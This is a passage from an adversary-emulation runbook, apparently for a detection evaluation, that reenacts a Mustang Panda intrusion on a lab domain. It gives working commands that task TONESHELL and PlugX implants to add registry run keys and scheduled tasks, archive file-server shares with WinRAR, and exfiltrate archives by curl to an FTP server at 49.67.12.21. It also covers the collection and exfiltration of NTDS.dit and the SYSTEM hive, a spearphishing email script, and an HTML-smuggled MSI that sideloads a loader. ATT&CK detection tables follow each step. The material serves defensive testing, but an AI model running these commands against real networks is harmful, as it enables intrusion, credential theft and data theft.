    ```text
    Successfully saved uploaded file as ntds.dit
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Execution | T1059.001 | Command and Scripting Interpreter: PowerShell | Windows | `code-tunnel.exe` executed PowerShell commands | Not Calibrated - Not Benign | Mustang Panda uses VS Code tunnel to execute PowerShell commands | harrenhal (10.55.4.103) | htargaryen | - | [26]
| Execution | T1059.003 | Command and Scripting Interpreter: Windows Command Shell | Windows | `code-tunnel.exe` executed CMD commands | Not Calibrated - Not Benign | Mustang Panda uses VS Code tunnel to execute CMD commands | harrenhal (10.55.4.103) | htargaryen | - | [26]
| Defense Evasion | T1006 | Direct Volume Access | Windows | `code-tunnel.exe` executed `vssadmin` to create a shadow copy of the `C:\` | Not Calibrated - Not Benign | Mustang Panda uses VS Code tunnel to execute `vssadmin` to create a shadow copy of the `C:\` | redkeep (10.55.3.100) | htargaryen | - | [25], [26]
| Collection | T1074 | Data Staged | Windows | `code-tunnel.exe` executed remote UNC path (over SMB) to stage the NTDS.dit | Not Calibrated - Not Benign | Mustang Panda uses VS Code tunnel to stage the NTDS.dit on the workstation `harrenhal (10.55.4.103)` | redkeep (10.55.3.100), harrenhal (10.55.4.103) | htargaryen | - | [25], [26]
| Credential Access | T1003.003 | OS Credential Dumping: NTDS | Windows | `code-tunnel.exe` executed reg.exe to save the SYSTEM registry file to C:\Windows\Temp\ | Calibrated - Not Benign | Mustang Panda uses VS Code tunnel to export the SYSTEM file registry | redkeep (10.55.3.100), harrenhal (10.55.4.103) | htargaryen | - | [25], [26]
| Exfiltration | T1041 | Exfiltration Over C2 Channel | Windows | waitfor.exe exfiltrated the SYSTEM hive to 191.44.44.199 | Not Calibrated - Not Benign | TONESHELL exfiltrates the SYSTEM hive | harrenhal (10.55.4.103) | htargaryen | [PerformFileUploadTask](../Resources/toneshell/src/shellcode/exec.cpp#L348-L440) | [26]
| Exfiltration | T1041 | Exfiltration Over C2 Channel | Windows | waitfor.exe exfiltreated the NTDS.dit to 191.44.44.199 | Not Calibrated - Not Benign | TONESHELL exfiltrates the NTDS.dit | harrenhal (10.55.4.103) | htargaryen | [PerformFileUploadTask](../Resources/toneshell/src/shellcode/exec.cpp#L348-L440) | [25]

## Step 5 - Persistence

### Voice Track

Mustang Panda then disconnects from the domain controller and installs persistence on
`harrenhal (10.55.4.103)` via registry run key `AccessoryInputServices` to
re-execute TONESHELL on user login. Mustang Panda then installs additional persistence by
creating a scheduled task to execute the VS Code tunnel batch script. Mustang Panda
then executes the persistence mechanism to establish the VS Code tunnel.

### Procedures

- ☣️ Return to the browser tab with the VS Code tunnel to the domain controller
`redkeep (10.55.3.100)`. Click the tunnel name (`redkeep`) in the bottom left
and select "close remote workspace"

- ☣️ Task TONESHELL to create the registry run key

  ```bash
  python3 /opt/kalidev/mustang_panda/Resources/controlServer/evalsC2client.py --set-task b7107b26bdc8e2eea0dc91c8e603370f '{"id": 5,  "taskNum": 9, "args": "reg.exe add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v AccessoryInputServices /t REG_SZ /d \"C:\\Users\\htargaryen\\Downloads\\250325_Pentos_Board_Minutes\\EssosUpdate.exe\" /f"}'
  ```

  - ***Expected Output***

    ```text
    The operation completed successfully.
    ```

- ☣️ Task TONESHELL to create a scheduled task to execute the VS Code tunnel batch
script every minute

  ```bash
  python3 /opt/kalidev/mustang_panda/Resources/controlServer/evalsC2client.py --set-task b7107b26bdc8e2eea0dc91c8e603370f '{"id": 5, "taskNum": 10, "args": "schtasks.exe /F /Create /TN AccessoryInputServices /sc minute /MO 1 /TR C:\\Users\\htargaryen\\AppData\\Local\\CodeHelper.bat"}'
  ```

  - ***Expected Output***

    ```text
    SUCCESS: The scheduled task "AccessoryInputServices" has successfully been created.
    ```

- ☣️ Once the scheduled task has executed, check the control server terminal and
confirm receipt of the authentication code from the VSCODE_TUNNEL handler

  - ***Expected Output***

    ```text
    [SUCCESS] 2025/04/15 15:28:42 [VSCODE_TUNNEL] USE AUTHENTICATION CODE: XXXX-XXXX
    ```

- ☣️ In a new browser tab on Kali, browse to the GitHub authentication portal and
Continue as the signed in adversary GitHub account

  | Destination
  |  -
  | <https://github.com/login/device/>

- ☣️ Enter the retrieved GitHub login device code and continue. Click "Authorize
Visual-Studio-Code" if prompted.

- ☣️ In a new browser tab, browse to access the VS Code tunnel then select GitHub

> Allow > Continue > Authorize Visual-Studio-Code if prompted. Wait until the VS
Code tunnel as connected successfully and the tunnel in the bottom left reads
`harrenhal`

  | Destination
  |  -
  | <https://vscode.dev/tunnel/harrenhal>

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Persistence | T1547.001 | Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder | Windows | waitfor.exe executed reg.exe to add the `AccessoryInputServices` registry run key | Calibrated - Not Benign | TONESHELL adds the registry run key `AccessoryInputServices` | harrenhal (10.55.4.103) | htargaryen | [PerformExecTask](../Resources/toneshell/src/shellcode/exec.cpp#L152-L239) | [25]
| Persistence | T1053.005 | Scheduled Task/Job: Scheduled Task | Windows | waitfor.exe created a new scheduled task named `AccessoryInputServices` to execute the `codehelper.bat` file every minute | Calibrated - Not Benign | TONESHELL creates scheduled task `AccessoryInputServices` | harrenhal (10.55.4.103) | htargaryen | [PerformExecTask](../Resources/toneshell/src/shellcode/exec.cpp#L152-L239) | [5], [25]
| Command and Control | T1572 | Protocol Tunneling | Windows | svchost.exe executed codehelper.bat that established the code-tunnel.exe | Calibrated - Not Benign | TONESHELL uses VS Code to establish a tunnel | harrenhal (10.55.4.103) | htargaryen | [startcode.bat](../Resources/payloads/startcode.bat) | [26]
| Lateral Movement | T1021.004 | Remote Services: SSH | Windows | htargaryen authenticated to github through code-tunnel.exe | Calibrated - Not Benign | TONESHELL authenticates with GitHub to connect to the tunnel | harrenhal (10.55.4.103) | htargaryen | - | [26]

## Step 6 - Collection and Exfiltration

### Voice Track

Mustang Panda then begins collecting and exfiltrating files of interest.
By using a
file list with file extensions and folders of interest, Mustang Panda uses the VS Code
tunnel to execute `WinRAR` against several drives of the previously discovered
file server `conclave (10.55.3.105)` to remotely compress files into 250 MB
volumes. Then, Mustang Panda uses OPRHEUS to download and execute a renamed `curl.exe`
and exfiltrate the created RAR archives to an adversary controlled FTP server
hosted at `49.67.12.21`

### Procedures

- ☣️ Task TONESHELL to download `files.txt` to `harrenhal (10.55.4.103)`

  ```bash
  python3 /opt/kalidev/mustang_panda/Resources/controlServer/evalsC2client.py --set-task b7107b26bdc8e2eea0dc91c8e603370f '{"id": 3, "taskNum": 11, "payload": "files.txt", "args": "C:\\Users\\htargaryen\\Downloads\\files.txt"}'
  ```

  - ***Expected Output***

    ```text
      [DEBUG] 2025/07/29 14:34:12 [TONESHELL] Received task request from implant UUID 3718210df587044d8e052c2ba9d053fd (session ID b7107b26bdc8e2eea0dc91c8e603370f)
      [DEBUG] 2025/07/29 14:34:22 [TONESHELL] Received task request from implant UUID 3718210df587044d8e052c2ba9d053fd (session ID b7107b26bdc8e2eea0dc91c8e603370f)
       [INFO] 2025/07/29 14:34:23 Received SetTaskBySessionId request
    [SUCCESS] 2025/07/29 14:34:23 Successfully set task for session: b7107b26bdc8e2eea0dc91c8e603370f
      [DEBUG] 2025/07/29 14:34:32 [TONESHELL] Received task request from implant UUID 3718210df587044d8e052c2ba9d053fd (session ID b7107b26bdc8e2eea0dc91c8e603370f)
      [DEBUG] 2025/07/29 14:34:32 [TONESHELL] Received file chunk request from session ID b7107b26bdc8e2eea0dc91c8e603370f
       [INFO] 2025/07/29 14:34:32 [TONESHELL] Sent file chunk to session ID b7107b26bdc8e2eea0dc91c8e603370f, task number 11: 82 bytes
      [DEBUG] 2025/07/29 14:34:32 [TONESHELL] Closed handle for file /opt/kalidev/mustang_panda/Resources/payloads/files.txt
       [INFO] 2025/07/29 14:34:32 [TONESHELL] Received task complete response from session ID b7107b26bdc8e2eea0dc91c8e603370f, task number 11; task type: 3, exit code: 0. Registering task output.
    [SUCCESS] 2025/07/29 14:34:32 [TONESHELL] Successfully downloaded file /opt/kalidev/mustang_panda/Resources/payloads/files.txt
      [DEBUG] 2025/07/29 14:34:42 [TONESHELL] Received task request from implant UUID 3718210df587044d8e052c2ba9d053fd (session ID b7107b26bdc8e2eea0dc91c8e603370f)
      [DEBUG] 2025/07/29 14:34:52 [TONESHELL] Received task request from implant UUID 3718210df587044d8e052c2ba9d053fd (session ID b7107b26bdc8e2eea0dc91c8e603370f)
    ```

- ☣️ Switch to the VS Code tunnel tab to the workstation `harrenhal
(10.55.4.103)`, open a **PowerShell** terminal if one is not already open, and
execute `rar.exe` remotely against drives A-Z of the file server `conclave
(10.55.3.105)`

  ```psh
  65..90 | %{ $drive = [char]$_; & "C:\Program Files\WinRAR\rar.exe" a -r -v250m -hpj5Tft5lLFFcQK -x*\appdata\ -x*\ProgramData\* -x*\Recovery\* -x'*\System Volume Information\*' -x'*\$RECYCLE.BIN\*' -x'*\Program Files\*' -x'*\Program Files (x86)\*' -x*\Windows\* -x*\Python312\* -x*\crash_dumps\* -x*\PerfLogs\* -n@"C:\Users\htargaryen\Downloads\files.txt" "C:\Windows\Temp\${drive}.rar" "\\10.55.3.105\${drive}`$\*"}
  ```

  - ***Expected Output***

    ```text
    RAR 7.11 x64   Copyright (c) 1993-2025 Alexander Roshal   20 Mar 2025
    Trial version             Type 'rar -?' for help

    Evaluation copy. Please register.

    Creating archive A.rar

    WARNING: No files

    ...

    Creating archive C.rar

    Adding    C:\...  OK
    Adding    C:\...  OK
    ...
    ```

- ☣️ Switch back to the terminal and task TONESHELL to download `curl.exe` to
`harrenhal (10.55.4.103)` as `prpbg.dat.bak.1`

  ```bash
  python3 /opt/kalidev/mustang_panda/Resources/controlServer/evalsC2client.py --set-task b7107b26bdc8e2eea0dc91c8e603370f '{"id": 3, "taskNum": 12, "payload": "curl.exe", "args": "C:\\Program Files\\Microsoft VS Code\\prpbg.dat.bak.1"}'
  ```

  - ***Expected Output***

    ```text
       [INFO] 2025/07/29 14:58:44 [TONESHELL] Sent file chunk to session ID b7107b26bdc8e2eea0dc91c8e603370f, task number 12: 32768 bytes
      [DEBUG] 2025/07/29 14:58:44 [TONESHELL] Received file chunk request from session ID b7107b26bdc8e2eea0dc91c8e603370f
       [INFO] 2025/07/29 14:58:44 [TONESHELL] Sent file chunk to session ID b7107b26bdc8e2eea0dc91c8e603370f, task number 12: 32768 bytes
      [DEBUG] 2025/07/29 14:58:44 [TONESHELL] Received file chunk request from session ID b7107b26bdc8e2eea0dc91c8e603370f
       [INFO] 2025/07/29 14:58:44 [TONESHELL] Sent file chunk to session ID b7107b26bdc8e2eea0dc91c8e603370f, task number 12: 32768 bytes
      [DEBUG] 2025/07/29 14:58:44 [TONESHELL] Received file chunk request from session ID b7107b26bdc8e2eea0dc91c8e603370f
       [INFO] 2025/07/29 14:58:44 [TONESHELL] Sent file chunk to session ID b7107b26bdc8e2eea0dc91c8e603370f, task number 12: 11720 bytes
      [DEBUG] 2025/07/29 14:58:44 [TONESHELL] Closed handle for file /opt/kalidev/mustang_panda/Resources/payloads/curl.exe
       [INFO] 2025/07/29 14:58:44 [TONESHELL] Received task complete response from session ID b7107b26bdc8e2eea0dc91c8e603370f, task number 12; task type: 3, exit code: 0. Registering task output.
    [SUCCESS] 2025/07/29 14:58:44 [TONESHELL] Successfully downloaded file /opt/kalidev/mustang_panda/Resources/payloads/curl.exe
      [DEBUG] 2025/07/29 14:58:54 [TONESHELL] Received task request from implant UUID 3718210df587044d8e052c2ba9d053fd (session ID b7107b26bdc8e2eea0dc91c8e603370f)
    ```

- ☣️ Task TONESHELL to use `curl.exe` and exfiltrate the RAR files

  ```bash
  python3 /opt/kalidev/mustang_panda/Resources/controlServer/evalsC2client.py --set-task b7107b26bdc8e2eea0dc91c8e603370f '{"id": 5, "taskNum": 13, "args": "C:\\Program Files\\Microsoft VS Code\\prpbg.dat.bak.1 -T \"{C:\\\\windows\\\\temp\\\\C.rar,C:\\\\windows\\\\temp\\\\E.rar,C:\\\\windows\\\\temp\\\\F.rar,C:\\\\windows\\\\temp\\\\G.rar,C:\\\\windows\\\\temp\\\\H.rar,C:\\\\windows\\\\temp\\\\J.rar}\" ftp://ftp_user:Gracious-Coat@49.67.12.21/do/ --ftp-create-dirs"}'
  ```

  - ***Expected Output***

    ```text
       [TASK] 2025/07/29 15:03:58   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100 10.0M    0     0  100 10.0M      0  13.1M --:--:-- --:--:-- --:--:-- 13.1M
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100 42.1M    0     0  100 42.1M      0  64.2M --:--:-- --:--:-- --:--:-- 64.2M
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100 42.1M    0     0  100 42.1M      0  76.1M --:--:-- --:--:-- --:--:-- 76.2M
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100 42.1M    0     0  100 42.1M      0  65.7M --:--:-- --:--:-- --:--:-- 65.6M
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100 42.1M    0     0  100 42.1M      0  75.2M --:--:-- --:--:-- --:--:-- 75.2M
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100 42.1M    0     0  100 42.1M      0  71.8M --:--:-- --:--:-- --:--:-- 71.8M
    ```

- ☣️ In any terminal on Kali, confirm exfiltration of the rar files

  | Password
  |  -
  | Barbed-Directive

  ```bash
  sudo ls -la /srv/ftp/do
  ```

  - ***Expected Output***

    ```text
    total 186024
    drwx------ 2 ftp_user ftp_user     4096 Jun 18 21:03 .
    drwxr-xr-x 5 ftp_user ftp_user     4096 Jun 18 21:03 ..
    -rw------- 1 ftp_user ftp_user 13599534 Jun 18 21:03 C.rar
    -rw------- 1 ftp_user ftp_user 88438606 Jun 18 21:03 E.rar
    -rw------- 1 ftp_user ftp_user 88438606 Jun 18 21:03 F.rar
    -rw------- 1 ftp_user ftp_user 88438606 Jun 18 21:03 G.rar
    -rw------- 1 ftp_user ftp_user 88436622 Jun 18 21:03 H.rar
    -rw------- 1 ftp_user ftp_user 88438606 Jun 18 21:03 J.rar
    ```

- Return to the RDP to `harrenhal (10.55.4.103)`. Close all windows then sign out.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Execution | T1059.001 | Command and Scripting Interpreter: PowerShell | Windows | code-tunnel.exe executed PowerShell commands | Not Calibrated - Not Benign | Mustang Panda uses VS Code tunnel to execute PowerShell commands | harrenhal (10.55.4.103) | htargaryen | - | [26]
| Lateral Movement | T1021.002 | Remote Services: SMB/Windows Admin Shares | Windows | code-tunnel.exe accessed shares of the file server `conclave (10.55.3.105)` remotely | Not Calibrated - Not Benign | Mustang Panda uses VS Code tunnel to remotely execute `rar.exe` against shares of the file server `conclave (10.55.3.105)` | conclave (10.55.3.105), harrenhal (10.55.4.103) | htargaryen | - | [25], [26]
| Collection | T1560.001 | Archive Collected Data: Archive via Utility | Windows | `rar.exe` compressed the A-Z shares of the file server `conclave (10.55.3.105)` | Not Calibrated - Not Benign | Mustang Panda uses `rar.exe` to compress the A-Z shares of the file server `conclave (10.55.3.105)` | conclave (10.55.3.105), harrenhal (10.55.4.103) | htargaryen | - | [25], [26]
| Command and Control | T1105 | Ingress Tool Transfer | Windows | waitfor.exe downloaded `curl.exe` as `C:\\Program Files\\Microsoft VS Code\\prpbg.dat.bak.1` | Not Calibrated - Not Benign | TONESHELL downloads `curl.exe` as `C:\\Program Files\\Microsoft VS Code\\prpbg.dat.bak.1` | harrenhal (10.55.4.103) | htargaryen | [PerformFileDownloadTask](../Resources/toneshell/src/shellcode/exec.cpp#L241-L346) | [21]
| Exfiltration | T1048.003 | Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol | Windows | waitfor.exe exfiltrated the RAR files over FTP to `49.67.12.21` | Calibrated - Not Benign | TONESHELL exfiltrates the RAR files over FTP to `49.67.12.21` | harrenhal (10.55.4.103) | htargaryen | [PerformExecTask](../Resources/toneshell/src/shellcode/exec.cpp#L152-L239) | [19], [21]

## Step 7 - Initial Access

### Voice Track

Mustang Panda sends a spearphishing email containing a link to the user `ccole`. When
the user `ccole` clicks on the link to open in the browser, the browser will
load the webpage (invite_doc.html) containing JavaScript that will initiate a
download of the malicious MSI file `2025p2.msi` to the user's workstation
`stepstones (10.55.4.104)`.

When the user executes the MSI installer
`2025p2.msi`, the installer drops the legitimate executable `gup.exe`, an
auxiliary file `gup.xml` needed for proper execution of `gup.exe`, the Plug X
loader `libcurl.dll`, the Plug X shellcode `WinGUpdate.dat`, and a decoy PDF
`Meeting Invitation.pdf`. Then, the MSI installer `2025p2.msi` executes the
legitimate executable `gup.exe`, which DLL sideloads the Plug X loader
`libcurl.dll`.

The Plug X loader displays the decoy PDF `Meeting
Invitation.pdf` and decrypts and loads the Plug X shellcode `WinGUpdate.dat`
into memory for execution. On execution, Plug X will establish an HTTPS-based
C2 channel to `ValarMorghulis.org:443`

### Procedures

- From the jumpbox, initiate an RDP session to the workstation `stepstones
(10.55.4.104)`

  | Destination | Username | Password
  |  - | - | -
  | stepstones.kingslanding.net | kingslanding\ccole | Cruel-Bold

- On the workstation `stepstones (10.55.4.104)`, open FireFox and browse to the
Outlook Web Access portal, logging in with ccole's credentials

  | Destination | Username | Password
  |  - | - | -
  | <https://sept.kingslanding.net/owa> | kingslanding\ccole | Cruel-Bold

- ☣️ Switch to the Kali machine and send the spearphishing email

  ```bash
  python3 /opt/kalidev/mustang_panda/Resources/email_generation/send_email.py mail.lorath.com /opt/kalidev/mustang_panda/Resources/payloads/plugx_spearphishing.html -t ccole@kingslanding.net -f fantaryon@lorath.com -fn 'Ferrego Antaryon' -s 'Meeting Invitation'
  ```

  - ***Expected Output***

    ```text
    Successfully sent email
    ```

- Switch to the RDP session to the workstation `stepstones (10.55.4.104)` and
confirm receipt of the spearphishing email

- Open the email and click the link inside the email. After the browser opens the
webpage, if the browser has paused the download due to a "Potential Security
Risk" click on the pop-up then "Allow" to proceed with the Download. Open the
Downloads folder to confirm download of the MSI installer `2025p2.msi`

- From the Downloads folder, double-click to open the MSI file `2025p2.msi` and
"Run". An MSI installer popup for "2025p2" should appear.

- Click "Next" in the 2025p2 installer wizard to reach the installations options
page. Make sure the selected installation folder is
`C:\Users\ccole\AppData\Local\EvRDRunMP\` and that installation is limited to
just the current user. Continue clicking "Next" until the installation
successfully completes, then click "Close" to exit the wizard. Confirm execution
of Plug X shellcode and a new implant session in the C2 handler on the Kali
machine.

- ☣️ Task Plug X to install persistence via registry key

  ```bash
  python3 /opt/kalidev/mustang_panda/Resources/controlServer/evalsC2client.py --set-task 123 '{"id": "0x1002"}'
  ```

  - ***Expected Output***

    ```text
    Successfully set registry key and value.
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Initial Access | T1566.002 | Phishing: Spearphishing Link | Windows | ccole received an email from fantaryon with a link http[:]mailstreamnet[.]com | Not Calibrated - Not Benign | Mustang Panda sends a spearphishing link to `ccole` | stepstones (10.55.4.104) | ccole | [send_email.py](../Resources/email_generation/send_email.py) | [3], [9], [14], [17]
| Execution | T1204.001 | User Execution: Malicious Link | Windows | ccole` clicks on the spearphishing email link http[:]mailstreamnet[.]com | Calibrated - Not Benign | `ccole` clicks on the spearphishing email link | stepstones (10.55.4.104) | ccole | - | [9], [14], [17]
| Defense Evasion | T1027.006 | Obfuscated Files or Information: HTML Smuggling | Windows | `invite_doc.html` contains a JavaScript Blob | Calibrated - Not Benign | `invite_doc.html` contains a JavaScript Blob | stepstones (10.55.4.104) | ccole | [JavaScript](../Resources/plugx/PlugxMSI/msi_smuggler.html.in#L13-L35) | [3], [14]
| Execution | T1059.007 | Command and Scripting Interpreter: JavaScript | Windows | `invite_doc.html` executes JavaScript | Not Calibrated - Not Benign | `invite_doc.html` executes JavaScript | stepstones (10.55.4.104) | ccole | - | [1], [3]
| Command and Control | T1105 | Ingress Tool Transfer | Windows | `invite_doc.html` downloads a malicious MSI file `2025p2.msi` | Calibrated - Not Benign | JavaScript in `invite_doc.html` downloads a malicious MSI file `2025p2.msi` | stepstones (10.55.4.104) | ccole | [Javascript downloads file](../Resources/plugx/PlugxMSI/msi_smuggler.html.in#L26-L35) | [3], [14]
| Execution | T1204.002 | User Execution: Malicious File | Windows | `ccole` opens the MSI file `2025p2.msi` | Not Calibrated - Not Benign | `ccole` opens the MSI file `2025p2.msi` | stepstones (10.55.4.104) | ccole | - | [1], [3]
| Persistence | T1218.007 | System Binary Proxy Execution: Msiexec | Windows | msiexec.exe` creates a new folder `%LOCALAPPDATA%\EvRDRunMP` containing `GUP.exe`,`gup.xml`,`libcurl.dll`, and`WinGUpdate.dat` | Calibrated - Not Benign | `msiexec.exe` creates a new folder `%LOCALAPPDATA%\EvRDRunMP` containing `GUP.exe`, `gup.xml`, `libcurl.dll`, and `WinGUpdate.dat` | stepstones (10.55.4.104) | ccole | - | [3], [14]
| Defense Evasion | T1027.013 | Obfuscated Files or Information: Encrypted/Encoded File | Windows | `WinGUpdate.dat` is encrypted using RC4 | Calibrated - Not Benign | Plug X shellcode `WinGUpdate.dat` is encrypted using RC4 | stepstones (10.55.4.104) | ccole | [rc4_encrypt_file.py](../Resources/plugx/src/shellcode/external_helpers/rc4_encrypt_file.py) | [3], [8], [14]
| Execution | T1218.007 | System Binary Proxy Execution: Msiexec | Windows | `msiexec.exe` executes `GUP.exe` | Not Calibrated - Not Benign | `msiexec.exe` executes `GUP.exe` | stepstones (10.55.4.104) | ccole | - | [3], [14]
| Defense Evasion | T1574.002 | Hijack Execution Flow: DLL Side-Loading | Windows | `GUP.exe` sideloads `libcurl.dll` | Calibrated - Not Benign | Legitimate binary `GUP.exe` sideloads Plug X loader `libcurl.dll` | stepstones (10.55.4.104) | ccole | [Exported function definitions](../Resources/plugx/src/loader/libcurl.nim#L93-L156) | [3], [7], [12], [14], [15]
| Defense Evasion | T1140 | Deobfuscate/Decode Files or Information | Windows | `libcurl.dll` reads and decrypts `WinGUpdate.dat` | Calibrated - Not Benign | Plug X loader `libcurl.dll` reads and decrypts Plug X shellcode `WinGUpdate.dat` | stepstones (10.55.4.104) | ccole | [Decrypt shellcode](../Resources/plugx/src/loader/libcurl.nim#L22-L32), [Read shellcode](../Resources/plugx/src/loader/libcurl.nim#L35-L48), [RC4.nim](../Resources/plugx/src/loader/RC4.nim) | [3], [7], [8], [12], [14], [15]
| Defense Evasion | T1620 | Reflective Code Loading | Windows | `libcurl.dll` loaded `WinGUpdate.dat` into memory | Calibrated - Not Benign | Plug X loader `libcurl.dll` loads the Plug X shellcode into memory | stepstones (10.55.4.104) | ccole | [Decrypt/read shellcode](../Resources/plugx/src/loader/libcurl.nim#L35-L48), [Load shellcode into memory](../Resources/plugx/src/loader/libcurl.nim#L64-L83) | [3], [7], [8], [12], [14]
| Defense Evasion | T1027.007 | Obfuscated Files or Information: Dynamic API Resolution | Windows | gup.exe dynamically resolves Windows API calls at runtime using the FNV1A hash. | Calibrated - Not Benign | Plug X dynamically resolves Windows API calls at runtime using the FNV1A hash. | stepstones (10.55.4.104) | ccole | [FetchFunctions](../Resources/plugx/src/shellcode/shellcode_util.cpp#L5-L200) | [8], [13]
| Defense Evasion | T1036 | Masquerading | Windows | gup.exe wrote a decoy PDF file `Meeting Invitation.pdf` to %TEMP%  | Not Calibrated - Not Benign | Plug X writes the decoy PDF file `Meeting Invitation.pdf` to %TEMP% then opens it | stepstones (10.55.4.104) | ccole | [HandleDecoyPDF](../Resources/plugx/src/shellcode/modules/DecoyPDF/DecoyPDF.cpp#L69-L173) | [3], [14], [17]
| Command and Control | T1071.001 | Application Layer Protocol: Web Protocols | Windows | gup.exe connected to `ValarMorghulis.org` over HTTPS | Calibrated - Not Benign | Plug X connects to `ValarMorghulis.org` over HTTPS | stepstones (10.55.4.104) | ccole | [getRequest](../Resources/plugx/src/shellcode/comms.cpp#L63-L185), [readResponse](../Resources/plugx/src/shellcode/comms.cpp#L187-L321), [Set server, port, and HTTPS at build](../Resources/plugx/src/shellcode/CMakeLists.txt#L66-L68) | [7]
| Command and Control | T1573.002 | Encrypted Channel: Asymmetric Cryptography | Windows | gup.exe leveraged HTTPS for encrypted communication with the C2 | Calibrated - Not Benign | Plug X leverages HTTPS for encrypted communication with the C2 | stepstones (10.55.4.104) | ccole | [getRequest](../Resources/plugx/src/shellcode/comms.cpp#L63-L185), [Initialize HTTPS](../Resources/plugx/src/shellcode/comms.cpp#L45-L51), [Set HTTPS at build](../Resources/plugx/src/shellcode/CMakeLists.txt#L68) | [2], [7]
| Persistence | T1547.001 | Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder | Windows | gup.exe created a registry run key named `WinGupSvc` | Calibrated - Not Benign | Plug X creates a registry run key named `WinGupSvc` | stepstones (10.55.4.104) | ccole | [HandleCreateRegistryRunKey](../Resources/plugx/src/shellcode/modules/CreateRegistryRunKey/CreateRegistryRunKey.cpp#L51-L130) | [3], [7], [8], [12], [14], [15]

## Step 8 - Collection and Exfiltration

### Voice Track

After establishing C2 with Plug X, Mustang Panda uses the RAR utility to locate and
archive Microsoft Office, PDF, and text files. Mustang Panda then leverages `curl` to
exfiltrate the RAR archive file.

### Procedures

- ☣️ Task Plug X to use WinRAR to archive specific file types. Plug X will hang
until the command has been completed. You may proceed once Plug X begins
checking in to the C2 server again.

  ```bash
  python3 /opt/kalidev/mustang_panda/Resources/controlServer/evalsC2client.py --set-task 123 '{"id": "0x1000", "args":"cmd.exe /c \"\"C:\\Program Files\\WinRAR\\rar.exe\" a -r -m5 -ibck -ed -v325m -hpI1HcgjY7bWRA8 -inul -ta202504230000000 C:\\Users\\Public\\Documents\\b44d0xUT5BLOi.rar \"C:\\*.pdf\" \"C:\\*.doc*\" \"C:\\*.ppt*\" \"C:\\*.xls*\" \"C:\\users\\*.png\" \"C:\\users\\*.jpg\" \"C:\\users\\*.jpeg\"\""}'
  ```

- ☣️ Task Plug X to exfiltrate the RAR file using curl to the attacker FTP server

  ```bash
  python3 /opt/kalidev/mustang_panda/Resources/controlServer/evalsC2client.py --set-task 123 '{"id": "0x1000", "args": "cmd.exe /c \"curl.exe -T C:\\Users\\Public\\Documents\\b44d0xUT5BLOi.rar ftp://ftp_user:Gracious-Coat@49.67.12.21/dp/ --ftp-create-dirs\""}'
  ```

  - ***Expected Output***

    ```text
    [SUCCESS] 2025/07/29 16:34:14 [Plug X] Reply from implant: 123
        % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100 10.3M    0     0  100 10.3M      0  13.0M --:--:-- --:--:-- --:--:-- 13.0M
    ```

- ☣️ In any terminal on Kali, confirm the size of the exfiltrated rar file is not
0 bytes

  | Password
  |  -
  | Barbed-Directive

  ```bash
  sudo ls -la /srv/ftp/dp
  ```

  - ***Expected Output***

    ```text
    total 9584
    drwxr-xr-x 2 ftp_user ftp_user    4096 Jul 16 14:26 .
    drwxr-xr-x 4 ftp_user ftp         4096 Jul 16 14:26 ..
    -rw-r--r-- 1 ftp_user ftp_user 9804926 Jul 16 14:26 b44d0xUT5BLOi.rar
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Execution | T1059.003 | Command and Scripting Interpreter: Windows Command Shell | Windows | gup.exe executed commands | Not Calibrated - Not Benign | Plug X executes commands | stepstones (10.55.4.104) | ccole | [HandleExecuteCommand](../Resources/plugx/src/shellcode/modules/ExecuteCommand/ExecuteCommand.cpp#L72-L170) | [3]
| Collection | T1005 | Data from Local System | Windows | gup.exe executed `rar.exe` to search for specific file extensions | Calibrated - Not Benign | Plug X uses `rar.exe` to search for specific file extensions | stepstones (10.55.4.104) | ccole | - | [1], [25]
| Collection | T1560.001 | Archive Collected Data: Archive via Utility | Windows | gup.exe used `rar.exe` to create RAR archives | Calibrated - Not Benign | Plug X uses `rar.exe` to create RAR archives | stepstones (10.55.4.104) | ccole | - | [23], [25]
| Exfiltration | T1048.003 | Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol | Windows | gup.exe executed `curl.exe` to exfiltrate RAR archives to attacker FTP server `49.67.12.21` | Calibrated - Not Benign | Plug X uses `curl.exe` to exfiltrate RAR archives to attacker FTP server `49.67.12.21` | stepstones (10.55.4.104) | ccole | [HandleExecuteCommand](../Resources/plugx/src/shellcode/modules/ExecuteCommand/ExecuteCommand.cpp#L72-L170) | [23], [25]

## Step 9 - Indicator Removal

### Voice Track

After exfiltrating files, Mustang Panda downloads batch script `del_WinGupSvc.bat` from
the C2 server then executes it. On execution, the batch script
`del_WinGupSvc.bat` deletes the registry run key, downloaded files, then itself.

### Procedures

